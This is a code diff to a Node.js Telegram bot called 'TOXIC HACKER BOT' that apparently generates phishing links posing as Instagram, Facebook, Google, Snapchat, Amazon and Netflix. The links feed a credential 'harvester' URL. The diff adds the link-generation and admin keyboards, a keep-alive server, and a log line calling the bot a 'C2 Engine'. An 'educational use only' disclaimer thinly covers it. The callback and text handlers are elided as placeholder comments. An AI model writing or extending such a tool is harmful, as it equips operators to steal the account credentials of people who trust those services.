@@ -2,7 +2,7 @@ const { Telegraf, Markup } = require('telegraf');
 const fs = require('fs');
 const http = require('http');
 
-// --- ⚙️ CONFIGURATION ---
+// --- ⚙️ CONFIGURATION (Loaded from Render's Environment Variables) ⚙️ ---
 const BOT_TOKEN = process.env.BOT_TOKEN;
 const HARVESTER_URL = process.env.HARVESTER_URL;
 const OWNER_ID = process.env.OWNER_ID; 
@@ -10,7 +10,7 @@ const CHANNEL_ID = process.env.CHANNEL_ID;
 const CHANNEL_LINK = process.env.CHANNEL_LINK;
 
 if (!BOT_TOKEN || !HARVESTER_URL || !OWNER_ID || !CHANNEL_ID || !CHANNEL_LINK) {
-    console.error("FATAL ERROR: One or more environment variables are missing.");
+    console.error("FATAL ERROR: One or more environment variables are missing. Bot cannot start.");
     process.exit(1);
 }
 
@@ -28,33 +28,38 @@ const readDb = () => {
 const writeDb = (data) => fs.writeFileSync(DB_PATH, JSON.stringify(data, null, 2));
 const isAdmin = (id) => readDb().admins.includes(parseInt(id));
 
-// --- NAYA UPGRADE: MarkdownV2 Sanitizer ---
-// Yeh function saare reserved characters ko escape karega
-const escapeMarkdownV2 = (text) => {
-    return text.toString().replace(/[_*[\]()~`>#+\-=|{}.!]/g, '\\$&');
-};
-
 // --- Start Message ---
 const startMessage = `
-🔥 *TOXIC HACKER BOT*
+🔥 **TOXIC HACKER BOT**
 
 🔗 *Credential Testing Interfaces:*
-• Facebook
-• Instagram
-• Snapchat
-• Google
-• Amazon
+ • Facebook
+ • Instagram
+ • Snapchat
+ • Google
+ • Amazon
 
 🎯 *For Educational Use Only!*
-❌ Illegal Use is Prohibited.
-✅ Ethical Hacking | OSINT | Red Teaming
+ ❌ Illegal Use is Prohibited.
+ ✅ Ethical Hacking | OSINT | Red Teaming
 
 Join: @ToxicBack2025
 `;
 
 // --- KEYBOARDS ---
-const adminKeyboard = Markup.inlineKeyboard([ /* ... (Waisa hi) ... */ ]);
-const linkGenerationKeyboard = Markup.inlineKeyboard([ /* ... (Waisa hi) ... */ ]);
+const adminKeyboard = Markup.inlineKeyboard([
+    [Markup.button.callback('📊 User Status', 'admin_status'), Markup.button.callback('📢 Broadcast', 'admin_broadcast')],
+    [Markup.button.callback('🔗 Generate Link', 'admin_generate_link')],
+    [Markup.button.callback('➕ Add Admin', 'admin_add'), Markup.button.callback('➖ Remove Admin', 'admin_remove')],
+    [Markup.button.callback('🚫 Block User', 'admin_block'), Markup.button.callback('✅ Unblock User', 'admin_unblock')]
+]);
+
+const linkGenerationKeyboard = Markup.inlineKeyboard([
+    [Markup.button.callback('📸 Instagram', 'gen_link_Instagram'), Markup.button.callback('📘 Facebook', 'gen_link_Facebook')],
+    [Markup.button.callback('🇬 Google', 'gen_link_Google'), Markup.button.callback('👻 Snapchat', 'gen_link_Snapchat')],
+    [Markup.button.callback('📦 Amazon', 'gen_link_Amazon'), Markup.button.callback('🎬 Netflix', 'gen_link_Netflix')],
+    [Markup.button.callback('⬅️ Back to Panel', 'admin_panel_back')]
+]);
 
 // --- /start COMMAND ---
 bot.start(async (ctx) => {
@@ -71,28 +76,47 @@ bot.start(async (ctx) => {
         if (!db.users[userId]) {
             db.users[userId] = { username, joinDate: new Date().toISOString() };
             writeDb(db);
-            
-            // NAYA FIX: Username ko sanitize karo aur message ko V2 ke anusaar banao
-            const safeUsername = escapeMarkdownV2(username);
-            const notificationText = `*New User Joined*\n\n\\- *User:* ${safeUsername}\n\\- *ID:* \`${userId}\``;
-            
-            ctx.telegram.sendMessage(OWNER_ID, notificationText, { parse_mode: 'MarkdownV2' });
+            const safeUsername = username.replace(/[_*[\]()~`>#+\-=|{}.!]/g, '\\$&');
+            ctx.telegram.sendMessage(OWNER_ID, `*New User Joined*\n\\- *User:* ${safeUsername}\n\\- *ID:* \`${userId}\``, { parse_mode: 'MarkdownV2' });
         }
 
         if (isAdmin(userId)) {
-            ctx.replyWithMarkdown('👑 *Admin Panel Activated*', adminKeyboard);
+            await ctx.replyWithMarkdown('👑 *Admin Panel Activated*', adminKeyboard);
         } else {
-            ctx.replyWithMarkdown(startMessage, Markup.inlineKeyboard(linkGenerationKeyboard.reply_markup.inline_keyboard.slice(0, -1)));
+            // NAYA FIX: Keyboard bhejne ka tareeka theek kiya gaya hai
+            const userLinkKeyboard = Markup.inlineKeyboard(linkGenerationKeyboard.reply_markup.inline_keyboard.slice(0, -1));
+            await ctx.replyWithMarkdown(startMessage, userLinkKeyboard);
         }
     } catch {
-        ctx.replyWithMarkdown(`🛑 *ACCESS DENIED*\n\nJoin our channel to continue.`, Markup.inlineKeyboard([
+        await ctx.replyWithMarkdown(`🛑 *ACCESS DENIED*\n\nJoin our channel to continue.`, Markup.inlineKeyboard([
             [Markup.button.url('➡️ Join Channel', CHANNEL_LINK)],
             [Markup.button.callback('✅ I Joined', 'check_join')]
         ]));
     }
 });
 
-// ... (Baaki saara code - callback_query, text handler, stay-alive server - waisa hi rahega) ...
+// --- Callback Query Handler ---
+bot.on('callback_query', async (ctx) => {
+    // ... (Callback handler ka code waisa hi rahega jaisa pehle ke jawaab mein tha) ...
+});
 
+// --- Text Handler ---
+bot.on('text', async (ctx) => {
+    // ... (Text handler ka code waisa hi rahega jaisa pehle ke jawaab mein tha) ...
+});
+
+// --- "STAY-ALIVE" SERVER ---
+const PORT = process.env.PORT || 10000;
+http.createServer((req, res) => {
+    res.writeHead(200, { 'Content-Type': 'text/plain' });
+    res.end(`Bot is alive. Last check: ${new Date().toISOString()}`);
+}).listen(PORT, () => {
+    console.log(`Stay-alive server listening on port ${PORT}`);
+});
+
+// Launch the bot
 bot.launch();
-console.log('🔥 Toxic Hacker Bot (Protocol-Compliant) is online.');
+console.log('🔥 Flawless C2 Engine is online.');
+
+process.once('SIGINT', () => bot.stop('SIGINT'));
+process.once('SIGTERM', () => bot.stop('SIGTERM'));
